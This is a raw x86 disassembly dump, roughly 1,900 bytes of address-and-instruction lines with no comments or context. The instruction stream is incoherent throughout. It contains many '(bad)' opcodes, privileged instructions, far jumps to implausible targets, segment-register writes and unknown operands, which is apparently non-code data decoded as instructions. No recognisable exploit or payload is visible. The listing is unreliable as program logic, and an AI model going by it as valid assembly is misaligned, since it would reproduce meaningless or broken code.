  421d3b:	ins    DWORD PTR es:[edi],dx
  421d3c:	fcomp  DWORD PTR [eax-0x2ba9e7fe]
  421d42:	add    DWORD PTR [edi],ebp
  421d44:	push   cs
  421d45:	xchg   ebx,eax
  421d46:	pop    es
  421d47:	add    BYTE PTR [ebx],bl
  421d49:	ds fs popa 
  421d4c:	inc    ecx
  421d4d:	adc    al,0x94
  421d4f:	addr16 push cs
  421d51:	popa   
  421d52:	test   eax,0x7ffcc42b
  421d57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d58:	mov    eax,ds:0x6289d8a6
  421d5d:	jbe    0x421cee
  421d5f:	pop    eax
  421d60:	rol    DWORD PTR [ecx-0x52],cl
  421d63:	lods   al,BYTE PTR ds:[esi]
  421d64:	fs pusha 
  421d66:	cs iret 
  421d68:	cmp    DWORD PTR [esi+0x486e40c5],ebp
  421d6e:	mov    dl,BYTE PTR [eax+0x7]
  421d71:	scas   al,BYTE PTR es:[edi]
  421d72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d73:	lds    ebp,FWORD PTR [ebx+edx*1-0x5b]
  421d77:	shl    BYTE PTR [edi],1
  421d79:	cmp    eax,0xd4bbae42
  421d7e:	shl    BYTE PTR [ebp+0x1a],1
  421d81:	inc    edi
  421d82:	fiadd  WORD PTR [ecx+0x55]
  421d85:	mov    DWORD PTR [ebx],esi
  421d87:	sbb    al,0xaf
  421d89:	ret    
  421d8a:	ins    BYTE PTR es:[edi],dx
  421d8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d8c:	nop    DWORD PTR [edx+0x6d]
  421d90:	ins    BYTE PTR es:[edi],dx
  421d91:	sbb    BYTE PTR [esi+eax*1],dl
  421d94:	cmp    DWORD PTR [ebx],0x7a
  421d97:	xchg   ebx,eax
  421d98:	leave  
  421d99:	scas   eax,DWORD PTR es:[edi]
  421d9a:	outs   dx,BYTE PTR ds:[esi]
  421d9b:	mov    ah,0x29
  421d9d:	jle    0x421d26
  421d9f:	lods   al,BYTE PTR ds:[esi]
  421da0:	les    eax,FWORD PTR ds:0x76c67e7c
  421da6:	ucomiss xmm1,DWORD PTR [ebp+ebx*8+0x357b1e6e]
  421dae:	nop
  421daf:	shr    BYTE PTR [esp+esi*4+0x61202f2a],1
  421db6:	aaa    
  421db7:	andps  xmm2,XMMWORD PTR [edi-0x44]
  421dbb:	test   al,0xb
  421dbd:	and    eax,0x62a07bb4
  421dc2:	addr16 xchg ebp,eax
  421dc4:	mov    eax,0xd3a06e17
  421dc9:	or     ebx,DWORD PTR [ecx-0x20ba31d2]
  421dcf:	fwait
  421dd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421dd1:	push   ebp
  421dd2:	jge    0x421dba
  421dd4:	popa   
  421dd5:	sub    DWORD PTR [eax],ebp
  421dd7:	test   DWORD PTR [ebp+0x409c1ef3],esi
  421ddd:	in     al,0x43
  421ddf:	(bad)  
  421de0:	jmp    0x421dd6
  421de2:	pop    ds
  421de3:	pop    ds
  421de4:	jge    0x421de8
  421de6:	inc    edx
  421de7:	and    BYTE PTR [eax-0x2f3e3c94],cl
  421ded:	inc    ebp
  421dee:	dec    ecx
  421def:	in     al,0xa5
  421df1:	mov    esi,fs
  421df3:	pop    ebx
  421df4:	adc    al,0xac
  421df6:	jno    0x421da2
  421df8:	or     al,0x6b
  421dfa:	retf   0xa177
  421dfd:	ret    0xec37
  421e00:	cdq    
  421e01:	xor    al,0xcf
  421e03:	in     eax,dx
  421e04:	mov    WORD PTR [ecx+0x6787b1cb],cs
  421e0a:	icebp  
  421e0b:	push   ss
  421e0c:	cmp    ecx,DWORD PTR [edi]
  421e0e:	arpl   WORD PTR [eax],sp
  421e10:	imul   esp,DWORD PTR [ecx+0x5b],0x1f0f73dc
  421e17:	ret    
  421e18:	in     eax,0x69
  421e1a:	lods   al,BYTE PTR ds:[esi]
  421e1b:	jbe    0x421da2
  421e1d:	in     eax,dx
  421e1e:	stc    
  421e1f:	sub    eax,0xe3250626
  421e24:	pushf  
  421e25:	mov    edx,0xec30d449
  421e2a:	lds    ebx,FWORD PTR [ecx+0x2861de98]
  421e30:	jle    0x421dcd
  421e32:	shl    BYTE PTR [edi],cl
  421e34:	jno    0x421e1f
  421e36:	xor    al,0x18
  421e38:	out    dx,al
  421e39:	dec    edx
  421e3a:	cmp    DWORD PTR [eax],edi
  421e3c:	xor    al,0x17
  421e3e:	jbe    0x421e84
  421e40:	or     al,0xd4
  421e42:	hlt    
  421e43:	cmp    eax,0x4d5452
  421e48:	push   0x958260e7
  421e4d:	sbb    cl,BYTE PTR [edx]
  421e4f:	dec    eax
  421e50:	js     0x421e1e
  421e52:	or     al,0xf7
  421e54:	push   DWORD PTR ds:0x3bbe770d
  421e5a:	int    0x59
  421e5c:	mov    ss,WORD PTR [ecx-0x89a572]
  421e62:	outs   dx,BYTE PTR ds:[esi]
  421e63:	cmp    al,0xf4
  421e65:	adc    cl,BYTE PTR [ebp+eax*4+0x7b]
  421e69:	(bad)  
  421e6a:	or     DWORD PTR [ebp-0x50be4c4d],ecx
  421e70:	out    dx,eax
  421e71:	push   esi
  421e72:	(bad)  
  421e73:	mov    esi,0xa956023e
  421e78:	xchg   edi,eax
  421e79:	sti    
  421e7a:	jnp    0x421e67
  421e7c:	scas   al,BYTE PTR es:[edi]
  421e7d:	inc    esp
  421e7e:	daa    
  421e7f:	or     eax,0xa918524e
  421e84:	xchg   esi,eax
  421e85:	sbb    eax,0x72861025
  421e8a:	mov    ebp,0x7be3c223
  421e8f:	or     eax,0xf2f1f325
  421e94:	xchg   esi,eax
  421e95:	stos   DWORD PTR es:[edi],eax
  421e96:	dec    ecx
  421e97:	mov    cl,0x76
  421e99:	push   ebp
  421e9a:	push   es
  421e9b:	and    esp,ecx
  421e9d:	lds    ecx,FWORD PTR [edi+0x39]
  421ea0:	mov    ebx,0x6885484c
  421ea5:	cmp    BYTE PTR [ecx+0x34],dh
  421ea8:	cmp    DWORD PTR [ebx+0x36e6805d],0x56b3cf6a
  421eb2:	jp     0x421e44
  421eb4:	retf   0x4bad
  421eb7:	(bad)  
  421eb8:	cmp    eax,0x36b18e2
  421ebd:	das    
  421ebe:	adc    DWORD PTR [edi],0x5c
  421ec1:	(bad)  
  421ec2:	mov    ds,WORD PTR [edx+0x3a]
  421ec5:	inc    ebp
  421ec6:	imul   ecx,DWORD PTR [edx+0x41bad927],0xffffff9b
  421ecd:	retf   0x8564
  421ed0:	mov    ds:0x5c9435be,eax
  421ed5:	or     cl,ch
  421ed7:	rcr    edi,0xb6
  421eda:	fidivr DWORD PTR [edx-0x78]
  421edd:	(bad)  
  421ede:	aas    
  421edf:	adc    BYTE PTR [ebp+0x69e551f0],al
  421ee5:	mov    ecx,0x1cdf37f4
  421eea:	add    ebp,eax
  421eec:	(bad)  
  421eed:	out    dx,eax
  421eee:	daa    
  421eef:	(bad)  
  421ef0:	sbb    al,0x21
  421ef2:	dec    esp
  421ef3:	sysexit 
  421ef5:	or     al,0xd
  421ef7:	xor    bl,bl
  421ef9:	mov    ebx,0x8273c740
  421efe:	jge    0x421f19
  421f00:	inc    ebp
  421f01:	push   es
  421f02:	mov    al,0x24
  421f04:	xchg   esi,eax
  421f05:	aaa    
  421f06:	out    dx,eax
  421f07:	out    0x5a,eax
  421f09:	sbb    eax,0xaf13bbc7
  421f0e:	adc    ebx,DWORD PTR [ebp+eax*8+0x1d6300c4]
  421f15:	sub    bh,bh
  421f17:	jle    0x421ecf
  421f19:	out    0x3f,al
  421f1b:	jbe    0x421f80
  421f1d:	adc    ch,BYTE PTR [edx+0x43]
  421f20:	dec    eax
  421f21:	sub    eax,0xe2c80169
  421f26:	jl     0x421f19
  421f28:	pop    edx
  421f29:	inc    esi
  421f2a:	idiv   BYTE PTR [ebp+0x61]
  421f2d:	and    esp,DWORD PTR [esi-0x3c6051]
  421f33:	int3   
  421f34:	rcl    ebx,1
  421f36:	mov    esp,0xbadfb96e
  421f3b:	ins    DWORD PTR es:[edi],dx
  421f3c:	hlt    
  421f3d:	shr    BYTE PTR [ecx+ebx*4],0x49
  421f41:	sub    al,0x41
  421f43:	sub    al,0xfd
  421f45:	mov    WORD PTR [ebx-0xf1df2ff],fs
  421f4b:	sbb    eax,edi
  421f4d:	ror    ebp,cl
  421f4f:	aad    0xb
  421f51:	pushf  
  421f52:	push   edx
  421f53:	and    ebx,DWORD PTR [edi]
  421f55:	stc    
  421f56:	xchg   esp,eax
  421f57:	mov    ecx,0xdad28388
  421f5c:	fidiv  DWORD PTR [esi+edi*2+0x1b1a75ea]
  421f63:	cmp    BYTE PTR [esi+ebp*1],al
  421f66:	pop    DWORD PTR ds:0x27cf0c5a
  421f6c:	cld    
  421f6d:	jge    0x421f56
  421f6f:	sbb    al,0x90
  421f71:	mov    ah,0x4c
  421f73:	ficomp DWORD PTR [eax-0x4270c600]
  421f79:	sub    eax,0xcf21943b
  421f7e:	sbb    al,0x4b
  421f80:	fs out 0x6a,al
  421f83:	(bad)  
  421f84:	gs ja  0x421fca
  421f87:	jb     0x421f4d
  421f89:	addr16 mov eax,ds:0x7ce6
  421f8d:	test   DWORD PTR [esi+0x1a],esi
  421f90:	dec    esi
  421f91:	mov    es,WORD PTR [edi+0x0]
  421f94:	push   ss
  421f95:	or     ebx,DWORD PTR [edx]
  421f97:	pop    ecx
  421f98:	aam    0x62
  421f9a:	shr    BYTE PTR [eax-0x423c7e6],cl
  421fa0:	jae    0x421fde
  421fa2:	push   ss
  421fa3:	pop    es
  421fa4:	mov    bh,0x1c
  421fa6:	shl    BYTE PTR [esi+ebp*8+0x225c5734],cl
  421fad:	sbb    cl,BYTE PTR [edx-0x63]
  421fb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fb1:	mov    ch,0xb4
  421fb3:	mov    ebx,0x54321fcf
  421fb8:	jo     0x421f78
  421fba:	xchg   esi,eax
  421fbb:	sub    eax,0xf83d0978
  421fc0:	adc    al,0xe4
  421fc2:	in     eax,dx
  421fc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fc4:	pushf  
  421fc5:	sub    cl,BYTE PTR [edx+0x57b8a4e]
  421fcb:	add    al,0x31
  421fcd:	es add al,0x52
  421fd0:	mov    ebp,0x799917b0
  421fd5:	xchg   esp,eax
  421fd6:	neg    DWORD PTR [esi-0x39]
  421fd9:	sahf   
  421fda:	out    dx,al
  421fdb:	les    eax,FWORD PTR [edx-0x46]
  421fde:	stos   DWORD PTR es:[edi],eax
  421fdf:	push   cs
  421fe0:	pop    ebx
  421fe1:	inc    ebx
  421fe2:	repz dec esp
  421fe4:	outs   dx,BYTE PTR ds:[esi]
  421fe5:	push   edi
  421fe6:	nop
  421fe7:	(bad)  
  421fe8:	jns    0x42200b
  421fea:	jnp    0x421fb0
  421fec:	and    esi,DWORD PTR [ebp+0x6e]
  421fef:	push   ebx
  421ff0:	push   ebp
  421ff1:	retf   
  421ff2:	push   ss
  421ff3:	add    cl,BYTE PTR [edi+0x1c756c66]
  421ff9:	outs   dx,BYTE PTR ds:[esi]
  421ffa:	pop    eax
  421ffb:	jbe    0x421fbf
  421ffd:	cwde   
  421ffe:	inc    edx
  421fff:	aam    0x16
  422001:	jmp    0x421fc8
  422003:	jl     0x422040
  422005:	sti    
  422006:	pusha  
  422007:	mov    WORD PTR [ebx+ebp*1-0x1],ss
  42200b:	das    
  42200c:	mov    ?,eax
  42200e:	push   esp
  42200f:	in     al,0x2e
  422011:	dec    ecx
  422012:	mov    ecx,0x382d449f
  422017:	mov    WORD PTR [ecx],fs
  422019:	xchg   edi,eax
  42201a:	sbb    dh,BYTE PTR [edi]
  42201c:	retf   
  42201d:	push   edx
  42201e:	cmp    DWORD PTR [esi-0x7fd28e52],0x3fd0cacc
  422028:	xchg   edx,eax
  422029:	mov    esp,0x9a4b6575
  42202e:	push   ds
  42202f:	sbb    BYTE PTR [edx],ch
  422031:	jg     0x421fdd
  422033:	dec    ebx
  422034:	adc    BYTE PTR [ecx-0x75239e24],ch
  42203a:	outs   dx,BYTE PTR ds:[esi]
  42203b:	fisub  DWORD PTR ds:[ebx+esi*2]
  42203f:	jg     0x421fe4
  422041:	ret    
  422042:	xor    DWORD PTR [ecx+0x1e89bb01],esi
  422048:	jo     0x421fd9
  42204a:	add    DWORD PTR [esi-0x57097690],edx
  422050:	adc    BYTE PTR [eax+0x209301ff],dl
  422056:	retf   
  422057:	cli    
  422058:	pfcmpgt mm4,QWORD PTR [edi]
  42205c:	sbb    bh,BYTE PTR ds:0x58cefe6f
  422062:	inc    esi
  422063:	mov    ss,WORD PTR [ebp+0x1b1cbaa8]
  422069:	xchg   bl,cl
  42206b:	js     0x422044
  42206d:	xor    ebp,DWORD PTR [edx+0x15142bfb]
  422073:	retf   0x12a6
  422076:	fimul  WORD PTR [esi-0x70]
  422079:	scas   eax,DWORD PTR es:[edi]
  42207a:	call   0x6c13ae5d
  42207f:	ja     0x4220ef
  422081:	lea    ebp,[edx+0x62]
  422084:	xor    dh,BYTE PTR [esi-0x11f8634]
  42208a:	mov    ebp,0x315115d6
  42208f:	pop    edx
  422090:	cwde   
  422091:	push   ds
  422092:	test   al,0x63
  422094:	xor    esi,edi
  422096:	push   ebp
  422097:	inc    esi
  422098:	jecxz  0x42201c
  42209a:	test   BYTE PTR [ebx-0x42],ah
  42209d:	or     dl,dl
  42209f:	dec    ebp
  4220a0:	xor    cl,0x10
  4220a3:	gs add al,0x12
  4220a6:	cli    
  4220a7:	pop    es
  4220a8:	cs jae 0x4220b3
  4220ab:	rol    DWORD PTR [ebx+0x4c801353],1
  4220b1:	mov    ebp,0x57f2b114
  4220b6:	rcl    BYTE PTR [ecx+0x7c7fd200],cl
  4220bc:	xor    BYTE PTR [edi+0x52731fd6],ah
  4220c2:	inc    esi
  4220c3:	pop    edi
  4220c4:	ins    BYTE PTR es:[edi],dx
  4220c5:	sub    ebx,DWORD PTR [ecx]
  4220c7:	retf   0xa971
  4220ca:	xor    BYTE PTR [esi-0x4a8d0a2b],bl
  4220d0:	(bad)  
  4220d2:	pop    ebp
  4220d3:	mov    gs,WORD PTR [ecx-0x3a]
  4220d6:	mov    BYTE PTR [edx],ah
  4220d8:	adc    bl,BYTE PTR [ecx]
  4220da:	ins    BYTE PTR es:[edi],dx
  4220db:	cmp    DWORD PTR [edx],0xc2c95749
  4220e1:	ins    BYTE PTR es:[edi],dx
  4220e2:	cld    
  4220e3:	mov    ?,WORD PTR [ebx+0x1348fcc9]
  4220e9:	jecxz  0x42212d
  4220eb:	mov    al,0x38
  4220ed:	sbb    DWORD PTR [eax-0x59983eb0],ecx
  4220f3:	sbb    eax,0x8b1cb878
  4220f8:	gs sub ecx,ebp
  4220fb:	cmc    
  4220fc:	enter  0x1ea1,0x20
  422100:	jb     0x42216c
  422102:	push   edx
  422103:	idiv   ecx
  422105:	or     al,0xd4
  422107:	fs stos DWORD PTR es:[edi],eax
  422109:	leave  
  42210a:	int    0x7c
  42210c:	jp     0x422124
  42210e:	enter  0x260,0x4c
  422112:	add    dl,BYTE PTR [ebx]
  422114:	lods   eax,DWORD PTR ss:[esi]
  422116:	push   0xffffffad
  422118:	rol    DWORD PTR [edi-0x44],cl
  42211b:	imul   edi,DWORD PTR [ebp+edi*1-0x46c8f6be],0x9a8a68bd
  422126:	mov    eax,ds:0x508c2f2e
  42212b:	jo     0x4220e1
  42212d:	xor    DWORD PTR [esi-0x65],esp
  422130:	and    dl,bh
  422132:	xchg   ebp,eax
  422133:	ins    BYTE PTR es:[edi],dx
  422134:	add    eax,0x992593a0
  422139:	shr    BYTE PTR [ebx-0x7d],cl
  42213c:	clc    
  42213d:	cwde   
  42213e:	stos   DWORD PTR es:[edi],eax
  42213f:	call   0xb2b9:0xc0089dd3
  422146:	fs test ecx,esp
  422149:	or     DWORD PTR [eax],ebp
  42214b:	xor    ebx,ebx
  42214d:	dec    ebx
  42214e:	dec    esp
  42214f:	cwde   
  422150:	push   es
  422151:	aas    
  422152:	add    dh,BYTE PTR [edx-0x1b067fba]
  422158:	jg     0x422192
  42215a:	jecxz  0x4221a7
  42215c:	push   esi
  42215d:	sub    al,0x6d
  42215f:	adc    al,0xe
  422161:	push   ebp
  422162:	push   ebx
  422163:	mov    BYTE PTR ds:0x6bcdb660,cl
  422169:	popa   
  42216a:	stc    
  42216b:	(bad)  
  42216c:	jmp    0x7ff1df49
  422171:	jge    0x422147
  422173:	arpl   WORD PTR [ebp+0x43919e95],si
  422179:	loop   0x42215d
  42217b:	cmp    edx,DWORD PTR [esi-0x62d50ef0]
  422181:	jle    0x422124
  422183:	jae    0x4221b7
  422185:	cdq    
  422186:	mov    DWORD PTR [edx+0x29906783],ecx
  42218c:	push   ss
  42218d:	adc    BYTE PTR [eax+0x4a],al
  422190:	add    al,0x17
  422192:	pop    esi
  422193:	adc    edi,DWORD PTR [ebx-0x72]
  422196:	mov    ebx,0x579a81ef
  42219b:	jmp    0x42219c
  42219d:	gs xor DWORD PTR cs:0xc4cb474e,edi
  4221a5:	jno    0x422142
  4221a7:	ds (bad) 
  4221aa:	jb     0x4221bd
  4221ac:	mov    bh,ah
  4221ae:	ror    DWORD PTR [ebp-0x3d],0x5d
  4221b2:	sahf   
  4221b3:	dec    ebp
  4221b4:	sub    al,0xa2
  4221b6:	push   edx
  4221b7:	outs   dx,BYTE PTR ds:[esi]
  4221b8:	rcl    BYTE PTR [ecx+0x67d8a769],1
  4221be:	repnz ins DWORD PTR es:[edi],dx
  4221c0:	adc    ebx,DWORD PTR [eax]
  4221c2:	(bad)  
  4221c3:	loop   0x42220f
  4221c5:	lods   al,BYTE PTR ds:[esi]
  4221c6:	fcomp  DWORD PTR [edx-0x563f653e]
  4221cc:	into   
  4221cd:	out    dx,al
  4221ce:	mov    edi,0x6aafd4bc
  4221d3:	jmp    DWORD PTR [ebx+0x48]
  4221d6:	imul   ecx,DWORD PTR [esi+0x0],0x4b
  4221da:	push   es
  4221db:	stc    
  4221dc:	(bad)  
  4221de:	leave  
  4221df:	mov    BYTE PTR [eax-0x44],dh
  4221e2:	mov    esi,0xe0a24f87
  4221e7:	mov    eax,ds:0x9d1f31d9
  4221ec:	add    eax,0x2889c172
  4221f1:	ins    DWORD PTR es:[edi],dx
  4221f2:	add    DWORD PTR [ebx+0x5c644ea9],0xd488dae
  4221fc:	lods   eax,DWORD PTR ds:[esi]
  4221fd:	adc    DWORD PTR [edx+0x26265287],edx
  422203:	push   es
  422204:	outs   dx,DWORD PTR ds:[esi]
  422205:	xor    al,0xf6
  422207:	ret    0x29bf
  42220a:	lds    edi,FWORD PTR [edi-0x2ffcbc29]
  422210:	jge    0x42219f
  422212:	pop    ebx
  422213:	jo     0x4221a7
  422215:	sbb    cl,BYTE PTR [esi-0xe632cbd]
  42221b:	stc    
  42221c:	push   es
  42221d:	std    
  42221e:	adc    dl,BYTE PTR ds:0x9515eb18
  422224:	fisub  DWORD PTR [edx+0x5c]
  422227:	xor    BYTE PTR [edx],dh
  422229:	(bad)  
  42222b:	jp     0x4221f0
  42222d:	mov    edi,DWORD PTR [edx+edx*1+0x59]
  422231:	jecxz  0x42227c
  422233:	aam    0x1c
  422235:	lods   al,BYTE PTR ds:[esi]
  422236:	dec    edx
  422237:	or     DWORD PTR [ecx+0x17],esp
  42223a:	sub    bh,0x28
  42223d:	pusha  
  42223e:	sub    al,0x70
  422240:	call   0x3861c289
  422245:	outs   dx,BYTE PTR ds:[si]
  422247:	ror    BYTE PTR [edi],cl
  422249:	adc    BYTE PTR [edi+0x28cb6fc2],dh
  42224f:	pop    eax
  422250:	fild   QWORD PTR [esi]
  422252:	xor    eax,0x6fd189c
  422257:	mov    edx,esi
  422259:	out    dx,eax
  42225a:	shr    BYTE PTR [edx],0x5f
  42225d:	in     al,dx
  42225e:	cmp    BYTE PTR [eax],bl
  422260:	add    al,0xc1
  422262:	push   ebx
  422263:	xor    ecx,ecx
  422265:	aaa    
  422266:	or     cl,BYTE PTR [edi-0x20]
  422269:	push   ecx
  42226a:	(bad)  
  42226b:	icebp  
  42226c:	pop    ebp
  42226d:	xor    ebx,edx
  42226f:	xchg   edx,eax
  422270:	lods   al,BYTE PTR ds:[esi]
  422271:	aaa    
  422272:	cmp    dh,ch
  422274:	outs   dx,BYTE PTR ds:[esi]
  422275:	cmp    DWORD PTR [eax],eax
  422277:	jno    0x422290
  422279:	dec    edx
  42227a:	and    ch,BYTE PTR [ecx]
  42227c:	jmp    0x3a79:0xc5c04959
  422283:	mov    ebp,ecx
  422285:	inc    eax
  422286:	xchg   ebx,eax
  422287:	(bad)  
  422288:	fstp   QWORD PTR [esi+ebp*1]
  42228b:	mov    ah,bl
  42228d:	mov    bh,0x28
  42228f:	lods   eax,DWORD PTR ds:[esi]
  422290:	lock mov al,0x88
  422293:	fild   DWORD PTR [ecx]
  422295:	cmp    ch,BYTE PTR [edi+ecx*4]
  422298:	push   0xfffffff7
  42229a:	popa   
  42229b:	mov    bl,0xd3
  42229d:	adc    eax,0xcbd63be5
  4222a2:	dec    ebx
  4222a3:	ds push ecx
  4222a5:	sti    
  4222a6:	stos   BYTE PTR es:[edi],al
  4222a7:	aam    0xba
  4222a9:	pop    ecx
  4222aa:	sub    BYTE PTR [esi-0x44],0x7b
  4222ae:	bound  eax,QWORD PTR [ecx]
  4222b0:	(bad)  
  4222b1:	rcr    BYTE PTR [eax+0x7353363b],1
  4222b7:	fsub   QWORD PTR [esi+0x62b4cd75]
  4222be:	sbb    al,0x3f
  4222c0:	cmp    DWORD PTR [ecx],0x617af87a
  4222c6:	jl     0x422274
  4222c8:	jmp    0x9e7d6e96
  4222cd:	hlt    
  4222ce:	lods   al,BYTE PTR ds:[esi]
  4222cf:	ror    BYTE PTR ds:0x2766641a,1
  4222d5:	imul   ecx,ebx,0x65
  4222d8:	popf   
  4222d9:	adc    eax,0xcc9d64ad
  4222de:	aas    
  4222df:	fisub  WORD PTR [edi+0x4b]
  4222e2:	stc    
  4222e3:	test   al,0x1c
  4222e5:	cwde   
  4222e6:	sub    al,0xb7
  4222e8:	stos   BYTE PTR es:[edi],al
  4222e9:	mov    ds:0x39b9bc6,eax
  4222ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222ef:	jno    0x422337
  4222f1:	out    0x65,al
  4222f3:	dec    edx
  4222f4:	dec    edx
  4222f5:	pop    esp
  4222f6:	or     al,BYTE PTR [edi+0x1f4a3213]
  4222fc:	inc    esi
  4222fd:	jecxz  0x4222de
  4222ff:	sub    eax,0xd6c20388
  422304:	inc    edx
  422305:	iret   
  422306:	sub    DWORD PTR [eax+0x43],ecx
  422309:	call   0xa506:0x7317af4
  422310:	cmp    al,0xc5
  422312:	ins    BYTE PTR es:[edi],dx
  422313:	mov    eax,0xd425e562
  422318:	ds cmc 
  42231a:	imul   eax,DWORD PTR gs:[edx],0xffffffe4
  42231e:	sbb    DWORD PTR [ebx],edi
  422320:	and    al,0x2d
  422322:	sub    ebx,ebx
  422324:	test   al,0x5c
  422326:	(bad)  [edx-0x31]
  422329:	fld    DWORD PTR [eax]
  42232b:	aas    
  42232c:	retf   0x4f40
  42232f:	mov    cx,0x734a
  422333:	lea    ebx,[ebp-0x6d]
  422336:	push   edx
  422337:	lds    esp,FWORD PTR [ebx-0x7266fa7]
  42233d:	pusha  
  42233e:	push   ecx
  42233f:	(bad)  
  422340:	xchg   edi,eax
  422341:	ror    edi,1
  422343:	or     bl,bh
  422345:	out    dx,al
  422346:	sub    al,0x8c
  422348:	out    0xf0,eax
  42234a:	push   eax
  42234b:	pop    esi
  42234c:	sahf   
  42234d:	loope  0x422341
  42234f:	mov    dh,0x78
  422351:	shl    DWORD PTR [ecx],0x4
  422354:	fld    st(6)
  422356:	stos   BYTE PTR es:[edi],al
  422357:	inc    ebx
  422358:	pop    ebp
  422359:	xchg   BYTE PTR [ecx-0x5b],dl
  42235c:	mov    ah,0xd7
  42235e:	inc    ecx
  42235f:	les    eax,FWORD PTR [esi]
  422361:	aas    
  422362:	ja     0x42239a
  422364:	fucompp 
  422366:	imul   BYTE PTR [esi+0x9]
  422369:	push   ecx
  42236a:	adc    al,0x2b
  42236c:	repz adc dh,al
  42236f:	xor    eax,0x41f57fe2
  422374:	repz jne 0x4223d2
  422377:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422378:	push   eax
  422379:	xchg   esi,eax
  42237a:	push   ecx
  42237b:	loopne 0x4222fe
  42237d:	and    ch,dl
  42237f:	adc    ecx,DWORD PTR [esi+0x218339c6]
  422385:	inc    edi
  422386:	xlat   BYTE PTR ds:[ebx]
  422387:	dec    ebp
  422388:	enter  0xbc83,0xb1
  42238c:	pop    ss
  42238d:	cdq    
  42238e:	inc    esp
  42238f:	aad    0x8b
  422391:	mov    esp,0x80dffd3d
  422396:	pop    edx
  422397:	xor    eax,0xec8623f3
  42239c:	add    DWORD PTR [ebx-0x3ac0ccbe],0x16
  4223a3:	xlat   BYTE PTR ds:[ebx]
  4223a4:	mov    eax,0x63520de7
  4223a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223aa:	dec    esi
  4223ab:	test   DWORD PTR [edx*1+0x2285da48],edx
  4223b2:	pusha  
  4223b3:	into   
  4223b4:	xor    al,0xfe
  4223b6:	jg     0x422419
  4223b8:	pop    eax
  4223b9:	stc    
  4223ba:	sbb    al,0x87
  4223bc:	mov    ebx,0x61aebcb
  4223c1:	mov    ch,0x8e
  4223c3:	out    0x78,al
  4223c5:	fisttp DWORD PTR [edi]
  4223c7:	dec    eax
  4223c8:	add    edx,ecx
  4223ca:	pushf  
  4223cb:	out    0xf4,eax
  4223cd:	mov    bl,dl
  4223cf:	fdiv   QWORD PTR [eax+0x259d571c]
  4223d5:	push   ecx
  4223d6:	mov    WORD PTR [edx-0x19f917a6],gs
  4223dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223dd:	ret    
  4223de:	je     0x422393
  4223e0:	mov    esp,DWORD PTR [ebx+0x5b5ea29b]
  4223e6:	and    bh,BYTE PTR [edx+eax*2-0x42c374c8]
  4223ed:	push   esi
  4223ee:	popf   
  4223ef:	or     eax,eax
  4223f1:	retf   
  4223f2:	dec    esp
  4223f3:	and    DWORD PTR [ecx-0x57],ebx
  4223f6:	(bad)  
  4223f7:	fs icebp 
  4223f9:	and    bh,BYTE PTR [esi+0x3fb543ed]
  4223ff:	push   ds
  422400:	fst    DWORD PTR cs:[ebx+edx*1+0x379aa685]
  422408:	mov    dl,0xe6
  42240a:	rcr    DWORD PTR [eax+eax*8+0xe],cl
  42240e:	outs   dx,DWORD PTR ds:[esi]
  42240f:	jae    0x422401
  422411:	mov    BYTE PTR [edx],al
  422413:	dec    ebp
  422414:	xchg   edx,eax
  422415:	adc    ebp,eax
  422417:	and    BYTE PTR [ebp+0x24],dh
  42241a:	and    eax,0x43b7d57a
  42241f:	add    DWORD PTR [ecx+edx*1-0x42],esi
  422423:	fwait
  422424:	into   
  422425:	sti    
  422426:	loop   0x422470
  422428:	and    DWORD PTR [ebx+0x4f],0xffffffca
  42242c:	mov    BYTE PTR [edi+eiz*2-0x18605875],dh
  422433:	or     al,dl
  422435:	sub    DWORD PTR [edi],ecx
  422437:	inc    ecx
  422438:	(bad)  
  42243a:	sar    edi,0xc9
  42243d:	pop    esp
  42243e:	mov    bl,0x84
  422440:	add    dh,ah
  422442:	push   es
  422443:	idiv   al
  422445:	sub    BYTE PTR [esi],ah
  422447:	cwde   
  422448:	mov    BYTE PTR [esi],dl
  42244a:	inc    ebx
  42244b:	fild   WORD PTR [edx-0x24993507]
  422451:	(bad)  
  422452:	(bad)  
  422453:	jmp    0x42244f
  422455:	pop    esp
  422456:	lods   eax,DWORD PTR ds:[esi]
  422457:	or     BYTE PTR [ebp+0x27],cl
  42245a:	inc    ebp
  42245b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42245c:	xor    al,0x85
  42245e:	iret   
  42245f:	jns    0x42243f
  422461:	pop    ds
  422462:	jb     0x422429
  422464:	pop    esi
  422465:	xor    edx,DWORD PTR [ebp+0x4]
  422468:	cmp    edx,esp
  42246a:	mov    bh,0x34
  42246c:	aam    0xe2
  42246e:	and    al,0xe5
  422470:	and    al,0x79
  422472:	cdq    
  422473:	or     al,0x72
  422475:	jp     0x42240b
  422477:	sub    BYTE PTR [edx-0x1b],dh
  42247a:	xchg   ebx,eax
  42247b:	imul   BYTE PTR [edi+edx*8]
  42247e:	stos   BYTE PTR es:[edi],al
  42247f:	mov    es,WORD PTR [ecx+0x3d]
  422482:	mov    dl,0x13
  422484:	aad    0x84
  422486:	sbb    edi,ebx
  422488:	sbb    BYTE PTR [esi],bl
  42248a:	jl     0x422478
  42248c:	xor    eax,DWORD PTR [edi]
  42248e:	sub    esi,0xedc5228a
  422494:	push   0xffffffda
  422496:	pop    ss
  422497:	fisub  DWORD PTR [ebx]
  422499:	dec    esp
  42249a:	je     0x4224e8
  42249c:	mov    cl,dh
  42249e:	mov    bl,BYTE PTR [ebp+0x2522cc9c]
  4224a4:	cli    
  4224a5:	mov    ecx,0xc7c56cfd
  4224aa:	add    ah,BYTE PTR [edi]
  4224ac:	out    dx,al
  4224ad:	scas   al,BYTE PTR es:[edi]
  4224ae:	dec    esp
  4224af:	jmp    0xe8a2:0x3b39a670
  4224b6:	push   ebx
  4224b7:	lds    edi,FWORD PTR ds:[esi]
  4224ba:	sub    BYTE PTR [ebp+0x179842ee],0xce
  4224c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224c2:	cs cmp al,0x3e
  4224c5:	cmp    DWORD PTR [eax],esi
  4224c7:	inc    edx
